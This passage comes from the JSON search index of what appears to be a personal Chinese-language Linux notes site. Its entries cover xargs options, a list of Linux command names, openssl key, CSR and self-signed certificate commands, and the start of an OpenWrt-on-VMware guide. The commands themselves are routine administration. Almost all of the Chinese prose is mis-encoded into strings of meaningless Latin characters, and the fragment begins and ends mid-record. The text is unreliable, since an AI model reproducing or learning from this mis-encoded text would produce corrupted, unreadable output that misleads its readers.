TMPDIR","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-index.html"},{"title":"xargs","text":"xargs å‘½ä»¤ æ˜¯ç»™å…¶ä»–å‘½ä»¤ä¼ é€’å‚æ•°çš„ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œä¹Ÿæ˜¯ç»„åˆå¤šä¸ªå‘½ä»¤çš„ä¸€ä¸ªå·¥å…·ã€‚ å®ƒæ“…é•¿å°†æ ‡å‡†è¾“å…¥æ•°æ®è½¬æ¢æˆå‘½ä»¤è¡Œå‚æ•°ï¼Œxargs èƒ½å¤Ÿå¤„ç†ç®¡é“æˆ–è€… stdin å¹¶å°†å…¶è½¬æ¢æˆç‰¹å®šå‘½ä»¤çš„å‘½ä»¤å‚æ•°ã€‚ xargs ä¹Ÿå¯ä»¥å°†å•è¡Œæˆ–å¤šè¡Œæ–‡æœ¬è¾“å…¥è½¬æ¢ä¸ºå…¶ä»–æ ¼å¼ï¼Œä¾‹å¦‚å¤šè¡Œå˜å•è¡Œï¼Œå•è¡Œå˜å¤šè¡Œã€‚ xargs çš„é»˜è®¤å‘½ä»¤æ˜¯ echoï¼Œç©ºæ ¼æ˜¯é»˜è®¤å®šç•Œç¬¦ã€‚ è¿™æ„å‘³ç€é€šè¿‡ç®¡é“ä¼ é€’ç»™ xargs çš„è¾“å…¥å°†ä¼šåŒ…å«æ¢è¡Œå’Œç©ºç™½ï¼Œä¸è¿‡é€šè¿‡ xargs çš„å¤„ç†ï¼Œæ¢è¡Œå’Œç©ºç™½å°†è¢«ç©ºæ ¼å–ä»£ã€‚ xargs æ˜¯æ„å»ºå•è¡Œå‘½ä»¤çš„é‡è¦ç»„ä»¶ä¹‹ä¸€ã€‚ xargsï¼ˆè‹±æ–‡å…¨æ‹¼ï¼š eXtended ARGumentsï¼‰æ˜¯ç»™å‘½ä»¤ä¼ é€’å‚æ•°çš„ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œä¹Ÿæ˜¯ç»„åˆå¤šä¸ªå‘½ä»¤çš„ä¸€ä¸ªå·¥å…·ã€‚ xargs å¯ä»¥å°†ç®¡é“æˆ–æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰æ•°æ®è½¬æ¢æˆå‘½ä»¤è¡Œå‚æ•°ï¼Œä¹Ÿèƒ½å¤Ÿä»æ–‡ä»¶çš„è¾“å‡ºä¸­è¯»å–æ•°æ®ã€‚ xargs ä¹Ÿå¯ä»¥å°†å•è¡Œæˆ–å¤šè¡Œæ–‡æœ¬è¾“å…¥è½¬æ¢ä¸ºå…¶ä»–æ ¼å¼ï¼Œä¾‹å¦‚å¤šè¡Œå˜å•è¡Œï¼Œå•è¡Œå˜å¤šè¡Œã€‚ xargs é»˜è®¤çš„å‘½ä»¤æ˜¯ echoï¼Œè¿™æ„å‘³ç€é€šè¿‡ç®¡é“ä¼ é€’ç»™ xargs çš„è¾“å…¥å°†ä¼šåŒ…å«æ¢è¡Œå’Œç©ºç™½ï¼Œä¸è¿‡é€šè¿‡ xargs çš„å¤„ç†ï¼Œæ¢è¡Œå’Œç©ºç™½å°†è¢«ç©ºæ ¼å–ä»£ã€‚ xargs æ˜¯ä¸€ä¸ªå¼ºæœ‰åŠ›çš„å‘½ä»¤ï¼Œå®ƒèƒ½å¤Ÿæ•è·ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºï¼Œç„¶åä¼ é€’ç»™å¦å¤–ä¸€ä¸ªå‘½ä»¤ã€‚ ä¹‹æ‰€ä»¥èƒ½ç”¨åˆ°è¿™ä¸ªå‘½ä»¤ï¼Œå…³é”®æ˜¯ç”±äºå¾ˆå¤šå‘½ä»¤ä¸æ”¯æŒ|ç®¡é“æ¥ä¼ é€’å‚æ•°ï¼Œ è€Œæ—¥å¸¸å·¥ä½œä¸­æœ‰æœ‰è¿™ä¸ªå¿…è¦ï¼Œæ‰€ä»¥å°±æœ‰äº† xargs å‘½ä»¤ï¼Œä¾‹å¦‚: find /sbin -perm +700 |ls -l # è¿™ä¸ªå‘½ä»¤æ˜¯é”™è¯¯çš„ find /sbin -perm +700 |xargs ls -l # è¿™æ ·æ‰æ˜¯æ­£ç¡®çš„ å‚æ•°é€‰é¡¹ -n <num> æŒ‡å®šæ¯è¡Œnumä¸ªè¾“å‡ºï¼Œé»˜è®¤æ˜¯æ— é™åˆ¶ -d <xxx> ä»¥xxxä¸ºåˆ†éš”ç¬¦ -a <file> ä»æ–‡ä»¶ä¸­è¯»å…¥ä½œä¸ºstdin -e <flag> æ³¨æ„æœ‰çš„æ—¶å€™å¯èƒ½ä¼šæ˜¯-Eï¼Œflagå¿…é¡»æ˜¯ä¸€ä¸ªä»¥ç©ºæ ¼åˆ†éš”çš„æ ‡å¿—ï¼Œå½“xargsåˆ†æåˆ°å«æœ‰flagè¿™ä¸ªæ ‡å¿—çš„æ—¶å€™å°±åœæ­¢ã€‚ -p å½“æ¯æ¬¡æ‰§è¡Œä¸€ä¸ªargumentçš„æ—¶å€™è¯¢é—®ä¸€æ¬¡ç”¨æˆ·(è¯¢é—®æ—¶, å¿…é¡»æ‰‹åŠ¨è¾“å…¥y, æ‰ä¼šæ‰§è¡Œ) -t è¡¨ç¤ºå…ˆæ‰“å°å‘½ä»¤ï¼Œç„¶åå†æ‰§è¡Œã€‚ -i , -I å¾—çœ‹linuxæ”¯æŒäº†ï¼Œå°†xargsçš„æ¯é¡¹åç§°ï¼Œä¸€èˆ¬æ˜¯ä¸€è¡Œä¸€è¡Œèµ‹å€¼ç»™ {}ï¼Œå¯ä»¥ç”¨ {} ä»£æ›¿ã€‚ -r no-run-if-empty, å½“xargsçš„è¾“å…¥ä¸ºç©ºçš„æ—¶å€™åˆ™åœæ­¢xargsï¼Œä¸ç”¨å†å»æ‰§è¡Œäº†ã€‚ -s <num> å‘½ä»¤è¡Œçš„æœ€å¤§å­—ç¬¦æ•°ï¼ŒæŒ‡çš„æ˜¯ xargs åé¢é‚£ä¸ªå‘½ä»¤çš„æœ€å¤§å‘½ä»¤è¡Œå­—ç¬¦æ•°ã€‚ -l å°†è¾“å…¥åˆ†æ®µï¼Œä¸€æ¬¡æ‰§è¡Œä¸€è¡Œï¼Œè¿™æ ·å¯ä»¥é¿å…å‚æ•°åˆ—è¡¨è¿‡é•¿è€Œå¯¼è‡´å‘½ä»¤è¡Œè¿‡é•¿çš„é—®é¢˜ -L <num> ä»æ ‡å‡†è¾“å…¥ä¸€æ¬¡è¯»å– num è¡Œé€ç»™ command å‘½ä»¤ã€‚ -x exitçš„æ„æ€ï¼Œä¸»è¦æ˜¯é…åˆ-sä½¿ç”¨ã€‚ -P ä¿®æ”¹æœ€å¤§çš„è¿›ç¨‹æ•°ï¼Œé»˜è®¤æ˜¯1ï¼Œä¸º0æ—¶å€™ä¸ºas many as it can ï¼Œè¿™ä¸ªä¾‹å­æˆ‘æ²¡æœ‰æƒ³åˆ°ï¼Œåº”è¯¥å¹³æ—¶éƒ½ç”¨ä¸åˆ°çš„å§ xargs ç»“åˆ find ä½¿ç”¨ ç”¨ rm åˆ é™¤å¤ªå¤šçš„æ–‡ä»¶æ—¶å€™ï¼Œå¯èƒ½å¾—åˆ°ä¸€ä¸ªé”™è¯¯ä¿¡æ¯: /bin/rm Argument list too long. ç”¨ xargs å»é¿å…è¿™ä¸ªé—®é¢˜: find . -type f -name \"*.log\" -print0 | xargs -0 rm -f xargs -0 å°† \\0 ä½œä¸ºå®šç•Œç¬¦ã€‚ ç”¨ä¾‹, æ‰¾apkåŒ…å¹¶å¤åˆ¶åˆ°æ–‡ä»¶å¤¹apks: find ./ -name \"*.apk\" 2>/dev/null | xargs -t -I \"{}\" cp \"{}\" apks å†æ¯”å¦‚MacOSä¸‹æŸ¥æ‰¾å½“å‰ç›®å½•çš„rstæ–‡æ¡£å: ls *.rst | xargs -L1 | cut -d. -f 1","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-XARGS.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-XARGS.html"},{"title":"LinuxæŒ‡ä»¤","text":"7z adjtimex alias apt-cache apt-get apt ar arp asciinema at ausearch awk base64 basename bash bg blkid bzip2 cal cat cd chage chattr chgrp chkconfig chmod chown chpasswd chroot clear cmp col command convert cp crond curl cut dd debbuild debmake df diff dirname dpkg-deb dpkg du echo edquota env eval exec expand expect export expr fdisk fg file find flock free fuser g++ gcc gdb genisoimage getfacle getfattr getopt gnome-terminal grep groupadd gunzip gzip halt hash head history host iconv(mac) ifcofig ifstat init inotifywait insmod iotop ip iptables-restore iptables-save iptables jobs join journalctl kill killall ld ldconfig ldd ln locale-gen locale lpr ls lsb_release lsblk lsmod lsof lszrz mail man mkdir mkfifo modinfo modprobe more mount mv mydumper myloader netstat nm nmcli nohub nohup nslookup ntpdate ntpq objdump od open openssl otool(mac) pandoc parted partprobe passwd paste patch pgrep ping pkexec pkill poweroff pr printf ps pv pwck pwd read readelf readlink reboot rename resolvconf rmmod route rsync runlevel rz scp script sed seq service set setfacle setfattr shutdown smartctl sort ss ssh-keygen ssh stat stdbuf strings su sudo sync systemctl sz tac tail tar taskset tcpdump tcping tee telnet test time top touch tput tr traceroute trap ttygif ttyrec ulimit umask umount unalias uname uniq unset unzip update-alternatives update-desktop-database uptime useradd userdel vmstat wall watch wc wget whereis which who whoami wireshark wrk xargs xz yes zenity zip","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-index.html"},{"title":"openssl","text":"å¸¸ç”¨æŒ‡ä»¤å¯è§: https://www.gy328.com/ref/docs/openssl.html è‹¥æ— æ³•è®¿é—®å¯è§: OpenSSLå‚è€ƒæ‰‹å†Œ </resources/pdf/OpenSSL å‚è€ƒæ‰‹å†Œ & openssl å¿«é€Ÿå…¥é—¨ - èœé¸Ÿæ•™ç¨‹.pdf> å®˜ç½‘: https://www.openssl.org å¼ºå¤§çš„å®‰å…¨å¥—æ¥å­—å±‚å¯†ç åº“, åˆ©ç”¨å®ƒçš„éšæœºåŠŸèƒ½æ¥ç”Ÿæˆå¯ä»¥ç”¨ä½œå¯†ç çš„éšæœºå­—æ¯å­—ç¬¦ä¸²: openssl rand -base64 10 # nU9LlHO5nsuUvw== # standard æ ‡å‡† # digest æ¶ˆåŒ– æ‘˜è¦ # cipher åŠ å¯† OpenSSLæœ‰ä¸¤ç§è¿è¡Œæ¨¡å¼ï¼šäº¤äº’æ¨¡å¼å’Œæ‰¹å¤„ç†æ¨¡å¼ã€‚ ç›´æ¥è¾“å…¥opensslå›è½¦è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œè¾“å…¥å¸¦å‘½ä»¤é€‰é¡¹çš„opensslè¿›å…¥æ‰¹å¤„ç†æ¨¡å¼ã€‚ OpenSSLæ•´ä¸ªè½¯ä»¶åŒ…å¤§æ¦‚å¯ä»¥åˆ†æˆä¸‰ä¸ªä¸»è¦çš„åŠŸèƒ½éƒ¨åˆ†ï¼šå¯†ç ç®—æ³•åº“ã€SSLåè®®åº“ä»¥åŠåº”ç”¨ç¨‹åºã€‚OpenSSLçš„ç›®å½•ç»“æ„è‡ªç„¶ä¹Ÿæ˜¯å›´ç»•è¿™ä¸‰ä¸ªåŠŸèƒ½éƒ¨åˆ†è¿›è¡Œè§„åˆ’çš„ã€‚ å¯¹ç§°åŠ å¯†ç®—æ³• OpenSSLä¸€å…±æä¾›äº†8ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œå…¶ä¸­7ç§æ˜¯åˆ†ç»„åŠ å¯†ç®—æ³•ï¼Œä»…æœ‰çš„ä¸€ç§æµåŠ å¯†ç®—æ³•æ˜¯RC4ã€‚è¿™7ç§åˆ†ç»„åŠ å¯†ç®—æ³•åˆ†åˆ«æ˜¯AESã€DESã€Blowfishã€CASTã€IDEAã€RC2ã€RC5ï¼Œéƒ½æ”¯æŒç”µå­å¯†ç æœ¬æ¨¡å¼ï¼ˆECBï¼‰ã€åŠ å¯†åˆ†ç»„é“¾æ¥æ¨¡å¼ï¼ˆCBCï¼‰ã€åŠ å¯†åé¦ˆæ¨¡å¼ï¼ˆCFBï¼‰å’Œè¾“å‡ºåé¦ˆæ¨¡å¼ï¼ˆOFBï¼‰å››ç§å¸¸ç”¨çš„åˆ†ç»„å¯†ç åŠ å¯†æ¨¡å¼ã€‚å…¶ä¸­ï¼ŒAESä½¿ç”¨çš„åŠ å¯†åé¦ˆæ¨¡å¼ï¼ˆCFBï¼‰å’Œè¾“å‡ºåé¦ˆæ¨¡å¼ï¼ˆOFBï¼‰åˆ†ç»„é•¿åº¦æ˜¯128ä½ï¼Œå…¶å®ƒç®—æ³•ä½¿ç”¨çš„åˆ™æ˜¯64ä½ã€‚äº‹å®ä¸Šï¼ŒDESç®—æ³•é‡Œé¢ä¸ä»…ä»…æ˜¯å¸¸ç”¨çš„DESç®—æ³•ï¼Œè¿˜æ”¯æŒä¸‰ä¸ªå¯†é’¥å’Œä¸¤ä¸ªå¯†é’¥3DESç®—æ³•ã€‚ éå¯¹ç§°åŠ å¯†ç®—æ³• OpenSSLä¸€å…±å®ç°äº†4ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼ŒåŒ…æ‹¬DHç®—æ³•ã€RSAç®—æ³•ã€DSAç®—æ³•å’Œæ¤­åœ†æ›²çº¿ç®—æ³•ï¼ˆECï¼‰ã€‚DHç®—æ³•ä¸€èˆ¬ç”¨æˆ·å¯†é’¥äº¤æ¢ã€‚RSAç®—æ³•æ—¢å¯ä»¥ç”¨äºå¯†é’¥äº¤æ¢ï¼Œä¹Ÿå¯ä»¥ç”¨äºæ•°å­—ç­¾åï¼Œå½“ç„¶ï¼Œå¦‚æœä½ èƒ½å¤Ÿå¿å—å…¶ç¼“æ…¢çš„é€Ÿåº¦ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥ç”¨äºæ•°æ®åŠ å¯†ã€‚DSAç®—æ³•åˆ™ä¸€èˆ¬åªç”¨äºæ•°å­—ç­¾åã€‚ ä¿¡æ¯æ‘˜è¦ç®—æ³• OpenSSLå®ç°äº†5ç§ä¿¡æ¯æ‘˜è¦ç®—æ³•ï¼Œåˆ†åˆ«æ˜¯MD2ã€MD5ã€MDC2ã€SHAï¼ˆSHA1ï¼‰å’ŒRIPEMDã€‚SHAç®—æ³•äº‹å®ä¸ŠåŒ…æ‹¬äº†SHAå’ŒSHA1ä¸¤ç§ä¿¡æ¯æ‘˜è¦ç®—æ³•ï¼Œæ­¤å¤–ï¼ŒOpenSSLè¿˜å®ç°äº†DSSæ ‡å‡†ä¸­è§„å®šçš„ä¸¤ç§ä¿¡æ¯æ‘˜è¦ç®—æ³•DSSå’ŒDSS1ã€‚ å¯†é’¥å’Œè¯ä¹¦ç®¡ç† å¯†é’¥å’Œè¯ä¹¦ç®¡ç†æ˜¯PKIçš„ä¸€ä¸ªé‡è¦ç»„æˆéƒ¨åˆ†ï¼ŒOpenSSLä¸ºä¹‹æä¾›äº†ä¸°å¯Œçš„åŠŸèƒ½ï¼Œæ”¯æŒå¤šç§æ ‡å‡†ã€‚ é¦–å…ˆï¼ŒOpenSSLå®ç°äº†ASN.1çš„è¯ä¹¦å’Œå¯†é’¥ç›¸å…³æ ‡å‡†ï¼Œæä¾›äº†å¯¹è¯ä¹¦ã€å…¬é’¥ã€ç§é’¥ã€è¯ä¹¦è¯·æ±‚ä»¥åŠCRLç­‰æ•°æ®å¯¹è±¡çš„DERã€PEMå’ŒBASE64çš„ç¼–è§£ç åŠŸèƒ½ã€‚OpenSSLæä¾›äº†äº§ç”Ÿå„ç§å…¬å¼€å¯†é’¥å¯¹å’Œå¯¹ç§°å¯†é’¥çš„æ–¹æ³•ã€å‡½æ•°å’Œåº”ç”¨ç¨‹åºï¼ŒåŒæ—¶æä¾›äº†å¯¹å…¬é’¥å’Œç§é’¥çš„DERç¼–è§£ç åŠŸèƒ½ã€‚å¹¶å®ç°äº†ç§é’¥çš„PKCS#12å’ŒPKCS#8çš„ç¼–è§£ç åŠŸèƒ½ã€‚OpenSSLåœ¨æ ‡å‡†ä¸­æä¾›äº†å¯¹ç§é’¥çš„åŠ å¯†ä¿æŠ¤åŠŸèƒ½ï¼Œä½¿å¾—å¯†é’¥å¯ä»¥å®‰å…¨åœ°è¿›è¡Œå­˜å‚¨å’Œåˆ†å‘ã€‚ åœ¨æ­¤åŸºç¡€ä¸Šï¼ŒOpenSSLå®ç°äº†å¯¹è¯ä¹¦çš„X.509æ ‡å‡†ç¼–è§£ç ã€PKCS#12æ ¼å¼çš„ç¼–è§£ç ä»¥åŠPKCS#7çš„ç¼–è§£ç åŠŸèƒ½ã€‚å¹¶æä¾›äº†ä¸€ç§æ–‡æœ¬æ•°æ®åº“ï¼Œæ”¯æŒè¯ä¹¦çš„ç®¡ç†åŠŸèƒ½ï¼ŒåŒ…æ‹¬è¯ä¹¦å¯†é’¥äº§ç”Ÿã€è¯·æ±‚äº§ç”Ÿã€è¯ä¹¦ç­¾å‘ã€åŠé”€å’ŒéªŒè¯ç­‰åŠŸèƒ½ã€‚ äº‹å®ä¸Šï¼ŒOpenSSLæä¾›çš„CAåº”ç”¨ç¨‹åºå°±æ˜¯ä¸€ä¸ªå°å‹çš„è¯ä¹¦ç®¡ç†ä¸­å¿ƒï¼ˆCAï¼‰ï¼Œå®ç°äº†è¯ä¹¦ç­¾å‘çš„æ•´ä¸ªæµç¨‹å’Œè¯ä¹¦ç®¡ç†çš„å¤§éƒ¨åˆ†æœºåˆ¶ã€‚ <opensslç”¨æ³•è¯¦è§£> https://www.cnblogs.com/yangxiaolan/p/6256838.html ä½¿ç”¨opensslç”Ÿæˆå¯†ç : â”Œâ”€â”€(yanqueã‰¿3675b5ebb8ce)-[~/test] â””â”€$ openssl passwd -1 -salt admin 123456 $1$admin$LClYcRe.ee8dQwgrFc5nz. å…¶ä¸­: passwd è¡¨ç¤ºç”Ÿæˆå¯†ç  -1 è¡¨ç¤ºä½¿ç”¨md5ç®—æ³• -salt è¡¨ç¤ºéšæœºä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åŠ ç› admin ç”¨æˆ·åæ˜æ–‡ 123456 ç”¨æˆ·å¯†ç æ˜æ–‡ å‘½ä»¤è¯´æ˜ req:ç”Ÿæˆè¯ä¹¦ç­¾åè¯·æ±‚(CSR)ã€‚ç”¨äºç”³è¯·è¯ä¹¦ã€‚ x509:X.509è¯ä¹¦æ ¼å¼ç›¸å…³æ“ä½œã€‚å¦‚ç­¾åCSRç”Ÿæˆè¯ä¹¦ã€ç­¾åå…¶ä»–è¯ä¹¦ç­‰ã€‚ genrsa:ç”ŸæˆRSAç§é’¥å’Œå…¬é’¥ã€‚ ä¸¾ä¸ªä¾‹å­: # ç”Ÿæˆ2048ä½RSAç§é’¥ openssl genrsa -out key.pem 2048 # ç”ŸæˆCSR openssl req -out csr.pem -newkey rsa:2048 -nodes -keyout key.pem # ä½¿ç”¨CAè¯ä¹¦å’Œç§é’¥ç­¾åCSRç”Ÿæˆè¯ä¹¦ openssl x509 -req -in csr.pem -CA ca.crt -CAkey ca.key -out cert.pem é€šç”¨é€‰é¡¹: -i n ä»å“ªä¸ªæ–‡ä»¶è¯»å–è¾“å…¥, æ¯”å¦‚ server.key -o ut æŒ‡å®šå°†ç»“æœè¾“å‡ºåˆ°æ–‡ä»¶ genrsa ç”ŸæˆRSAç§é’¥å’Œå…¬é’¥ -d es3 æŒ‡å®šä½¿ç”¨des3ç®—æ³• -a es256 ä½¿ç”¨aes256å¯¹å¯†é’¥æ–‡ä»¶è¿›è¡Œå¯¹ç§°åŠ å¯† rsa -p ubout å½“éœ€è¦æ ¹æ®ç§é’¥ç”Ÿæˆå…¬é’¥æ—¶, ä½¿ç”¨æ­¤é€‰é¡¹ -a es256 ä½¿ç”¨aes256å¯¹å¯†é’¥æ–‡ä»¶è¿›è¡Œå¯¹ç§°åŠ å¯† req è¯·æ±‚ç”Ÿæˆè¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶ -n ew æŒ‡å®šæ–°ç”Ÿæˆè¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶ -k ey æŒ‡å®šç­¾åæ—¶, ä½¿ç”¨çš„ç§é’¥, å¦‚server.key -k eyout ç›´æ¥ä¸€æ­¥ç”Ÿæˆè¯ä¹¦æˆ–è¯ä¹¦è¯·æ±‚ä¸å¯†é’¥æ—¶, ä½¿ç”¨æ­¤é€‰é¡¹æŒ‡å®šå¯†é’¥åç§° -n odes æŒ‡å®šå¯†é’¥æ–‡ä»¶ä¸åŠ å¯† -p assout è‹¥éœ€è¦åŠ å¯†, å‘½ä»¤è¡ŒæŒ‡å®šå¯†ç , æ ¼å¼: pass:å¯†ç  , å¦åˆ™å¯åœ¨äº¤äº’å¼ç•Œé¢æ‰‹åŠ¨è¾“å…¥ -n ewkey æŒ‡å®šç®—æ³•, æ ¼å¼: <algorithm>:<bits> , å³ <ç®—æ³•>:<é•¿åº¦> , è‹¥ä¸æŒ‡å®šåŠ å¯†æ–¹å¼encryption, ç§é’¥å°†ä»¥æ˜æ–‡ä¿å­˜, æ‰€ä»¥é€šå¸¸ä¼šä½¿ç”¨å¦‚aes256çš„å¯¹ç§°åŠ å¯†ç®—æ³•è¿›è¡Œç§é’¥çš„åŠ å¯†, æé«˜å®‰å…¨æ€§. å¦‚: rsa:3048, ec:2048. å…¶ä»–: -x509 ç›´æ¥ä½¿ç”¨è¯¥CSRç”Ÿæˆè‡ªç­¾åè¯ä¹¦, è€Œä¸éœ€è¦ç¬¬ä¸‰æ–¹CAç­¾å(-outçš„ç»“æœå°±æ˜¯è¯ä¹¦) ca ä½œä¸ºcaæœºæ„å¯¹ è¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶ è¿›è¡Œç­¾å -c ert ä½¿ç”¨çš„è¯ä¹¦ -k eyfile ä½¿ç”¨çš„ç§é’¥ x509 X.509è¯ä¹¦æ ¼å¼ç›¸å…³æ“ä½œã€‚å¦‚ç­¾åCSRç”Ÿæˆè¯ä¹¦ã€ç­¾åå…¶ä»–è¯ä¹¦ç­‰ã€‚ -C Aform æŒ‡å®šè¯ä¹¦æ ¼å¼ -C A caæœºæ„æ‰€ä½¿ç”¨çš„è¯ä¹¦, éœ€è¦ä¸ºPEMæ ¼å¼, å¦åˆ™éœ€ç”¨-CAformæŒ‡å®šæ ¼å¼ -C Akeyform æŒ‡å®šå¯†é’¥æ ¼å¼ -C Akey caæœºæ„æ‰€ä½¿ç”¨çš„ç§é’¥, éœ€è¦ä¸ºPEMæ ¼å¼, å¦åˆ™éœ€ç”¨-CAkeyformæŒ‡å®šæ ¼å¼ -d ays æŒ‡å®šè¯ä¹¦æœ‰æ•ˆæœŸ -s ignkey è‡ªç­¾åæ—¶, ä½¿ç”¨æ­¤é€‰é¡¹æŒ‡å®šcaå¯†é’¥ -t ext è¾“å‡ºè¯ä¹¦ä¿¡æ¯ -n oout ä¸è¾“å‡ºè¯ä¹¦, ä¸€èˆ¬ä¸ -textä¸€èµ·ä½¿ç”¨ -C Acreateserial åœ¨ç­¾å‘æ–°è¯ä¹¦æ—¶è‡ªåŠ¨åˆ›å»ºè¯ä¹¦åºåˆ—å·æ–‡ä»¶ ä¸ºäº†ç®€åŒ– OpenSSL ä¸­è¯ä¹¦ç­¾å‘æµç¨‹,è‡ªåŠ¨å®Œæˆåºåˆ—å·æ–‡ä»¶çš„åˆ›å»º (åœ¨ubuntuä¸Šæµ‹è¯•æ—¶srlåç¼€çš„æ–‡ä»¶) ä¾‹å¦‚æŸ¥çœ‹è¯ä¹¦ä¿¡æ¯: openssl x509 -in xxx.crt -text -noout version æŸ¥çœ‹ç‰ˆæœ¬åŠç›¸å…³ä¿¡æ¯ å¦‚linuxæŸ¥çœ‹opensslå®‰è£…ç›®å½•(ä¸é€‚ç”¨mac): openssl version -a | grep OPENSSLDIR ç”¨ä¾‹: Mac ä¸Šåˆ¶ä½œ SSL è¯ä¹¦ èƒŒæ™¯: æ­å»ºburpsuiteæœåŠ¡æ—¶ï¼Œå¯é€‰ä½¿ç”¨è¯ä¹¦ ç¯å¢ƒ: MacOS 12.5, openssl ç”Ÿæˆrsaç§é’¥ï¼Œdes3ç®—æ³•ï¼Œ1024ä½å¼ºåº¦ï¼Œssl.keyæ˜¯ç§˜é’¥æ–‡ä»¶å: openssl genrsa -des3 -out ssl.key 1024 æ ¹æ®æç¤ºè¾“å…¥å¯†ç ã€‚å½“å‰æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆä¸€ä¸ª ssl.key æ–‡ä»¶ã€‚ åˆ é™¤å¯†ç , è¿™é‡Œç›®å½•å’Œç”Ÿæˆç§é’¥çš„ç›®å½•ä¸€è‡´: openssl rsa -in ssl.key -out ssl.key ç”Ÿæˆ CSRï¼ˆè¯ä¹¦ç­¾åè¯·æ±‚ï¼‰. æ ¹æ®æ ¹æ®åˆšåˆšç”Ÿæˆçš„ key æ–‡ä»¶æ¥ç”Ÿæˆè¯ä¹¦è¯·æ±‚æ–‡ä»¶: openssl req -new -key ssl.key -out ssl.csr ä¾æ¬¡è¾“å…¥å›½å®¶ã€åœ°åŒºã€åŸå¸‚ã€ç»„ç»‡ã€ç»„ç»‡å•ä½ã€Common Nameã€Email å’Œå¯†ç ã€‚ å…¶ä¸­ Common Name åº”è¯¥ä¸åŸŸåä¿æŒä¸€è‡´ã€‚å¯†ç æˆ‘ä»¬å·²ç»åˆ æ‰äº†,ç›´æ¥å›è½¦å³å¯ã€‚ æ³¨è§£ Common Name å°±æ˜¯è¯ä¹¦å¯¹åº”çš„åŸŸååœ°å€ï¼Œæˆ‘ä»¬å¼€å‘å¾®ä¿¡å°ç¨‹åºæ—¶å¿…é¡»è¦è®©æˆ‘ä»¬çš„å¤–é“¾çš„ https çš„åŸŸåå’Œè¯ä¹¦ç»Ÿä¸€æ‰è¡Œã€‚ ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ã€‚æ ¹æ®ä»¥ä¸Š 2 ä¸ªæ–‡ä»¶ç”Ÿæˆ crt è¯ä¹¦æ–‡ä»¶ï¼Œç»ˆç«¯æ‰§è¡Œä¸‹é¢å‘½ä»¤: openssl x509 -req -days 3650 -in ssl.csr -signkey ssl.key -out ssl.crt è¿™é‡Œ3650æ˜¯è¯ä¹¦æœ‰æ•ˆæœŸ(å•ä½ï¼šå¤©)ã€‚è¿™ä¸ªå¤§å®¶éšæ„ã€‚æœ€åä½¿ç”¨åˆ°çš„æ–‡ä»¶æ˜¯keyå’Œcrtæ–‡ä»¶ã€‚ åˆ°è¿™é‡Œæˆ‘ä»¬çš„è¯ä¹¦(ssl.key å’Œ ssl.crt) å°±å·²ç»åˆ›å»ºæˆåŠŸäº†å¯ä»¥ç›´æ¥ç”¨åˆ° https çš„ server ä¸­äº†ã€‚ åœ¨ä»£ç ä¸­ä½¿ç”¨è¯ä¹¦: https .createServer( { key: fs.readFileSync(\"./cert_key/ssl.key\"), cert: fs.readFileSync(\"./cert_key/ssl.crt\") }, app ) .listen(1993); è¯¦æƒ…ä»‹ç» è§: openssl","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl.html"},{"title":"ç›¸å…³ç®—æ³•","text":"RSAç®—æ³•","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-Related-algorithm-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-Related-algorithm-index.html"},{"title":"openssl","text":"ç›¸å…³ç®—æ³• ä¸€äº›é—®é¢˜è¯´æ˜","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-openssl-index.html"},{"title":"VMwareå®‰è£OpenWrt","text":"å®˜ç½‘ä¸‹è½½åœ°å€ å› ä¸ºæˆ‘æ˜¯è™šæ‹Ÿæœºå®‰è£…, ç³»ç»Ÿæ˜¯64ä½, æ‰€ä»¥å°±åªçœ‹è¿™ä¸ªé¡µé¢çš„: https://downloads.openwrt.org/releases/23.05.2/targets/x86/64/ æˆ–è€…é€šç”¨ç‰ˆä¹Ÿè¡Œ: https://downloads.openwrt.org/releases/23.05.2/targets/x86/generic/ , äºŒé€‰ä¸€å³å¯ ç›´æ¥é€‰ç»„åˆåŒ…å§: åŒºåˆ«: ext4 rootfså¯ä»¥æ‰©å±•ç£ç›˜ç©ºé—´å¤§å°ï¼Œè€Œsquashfsä¸èƒ½ã€‚ squashfs rootfså¯ä»¥ä½¿ç”¨é‡ç½®åŠŸèƒ½ï¼ˆæ¢å¤å‡ºå‚è®¾ç½®ï¼‰ï¼Œè€Œext4ä¸èƒ½ã€‚ è™šæ‹Ÿæœºåˆ›å»ºç¯å¢ƒ å…ˆä¸å®‰è£…æ“ä½œç³»ç»Ÿ, é€‰æ‹©linux è‡ªç”±é€‰æ‹©åç§°, ä½ç½®: å¤„ç†å™¨ç»™ä¸€ä¸ªå°±è¡Œ å†…å­˜é»˜è®¤å³å¯(è¦å¤šç»™ä¹Ÿè¡Œ) ç½‘ç»œé€‰æ‹©æ¡¥æ¥(è¿™é‡Œå°±æ˜¯ä½¿ç”¨VMçš„å¥½å¤„, 